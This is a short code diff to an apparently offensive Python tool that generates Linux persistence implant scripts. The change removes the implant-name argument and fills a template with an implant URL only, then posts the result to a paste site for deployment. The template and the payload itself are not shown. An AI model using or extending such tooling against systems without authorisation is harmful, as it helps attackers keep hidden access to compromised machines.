@@ -27,12 +27,12 @@ def save_payload(data: str, filepath: str) -> None:
 	with open(filepath, "w") as file:
 		file.write(data)
 
-def generate_payload(implant_name, implant_url):
+def generate_payload(implant_url):
 	info("Loading template..")
 	loaded_template = load_template(TEMPLATE)
 
 	info("Setting loaded template..")
-	script = loaded_template.replace("<IMPLANT>", implant_name).replace("<URL_IMPLANT>", implant_url)
+	script = loaded_template.replace("<URL_IMPLANT>", implant_url)
 
 	info("Creating paste for payload deployment")
 	pastebin_url = create_paste(script)
@@ -43,7 +43,6 @@ def generate_payload(implant_name, implant_url):
 
 def main():
 	parser = argparse.ArgumentParser(description="Generates a Linux persistence implant script to deploy quickly.")
-	parser.add_argument("--name", "-n", required=True, help="Implant name")
 	parser.add_argument("--url", "-u", required=True, help="Implant URL")
 	args = parser.parse_args()
 
